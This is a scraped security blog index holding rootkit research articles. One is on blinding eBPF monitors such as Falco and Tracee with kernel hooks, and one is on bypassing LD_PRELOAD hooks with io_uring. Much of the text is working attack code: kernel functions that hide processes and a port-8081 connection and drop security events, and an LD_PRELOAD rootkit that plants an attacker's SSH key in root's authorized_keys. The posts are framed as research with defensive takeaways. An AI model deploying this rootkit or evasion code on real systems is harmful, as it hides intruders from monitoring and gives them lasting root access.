(pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And common attacker workflows (process hiding and suspicious network behavior).\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nTarget the data path, not the program: If you can control the kernel-side plumbing that carries events to user space, the eBPF program can \u0026ldquo;run correctly\u0026rdquo; while its output never arrives.\nEnumerators are just another surface: Iterator-based tools depend on bpf_iter_run_prog() and seq_file writes. Filtering there can make multiple views of the system agree on a lie.\nEvent delivery is a choke point: Whether a tool uses ring buffer (BPF_MAP_TYPE_RINGBUF) or perf buffer (BPF_MAP_TYPE_PERF_EVENT_ARRAY), the kernel→userspace boundary creates a natural interception point.\nState can be selectively erased: Map lookups/updates are convenient places to make hidden PIDs appear \u0026ldquo;not found\u0026rdquo; without breaking the rest of the system.\nOnce the kernel is hostile, observability is best-effort: eBPF improves visibility under a trusted kernel. It does not harden a compromised kernel.\nWhat this PoC demonstrates:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques :)\nBottom line: once the kernel is attacker-controlled, the system’s \u0026ldquo;ground truth\u0026rdquo; is no longer trustworthy. eBPF raises the bar under a trusted kernel, but it can’t be the last line of defense against a hostile one.\nThe real win is preventing kernel compromise in the first place (boot trust, module enforcement, and layered detection outside the host).\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and 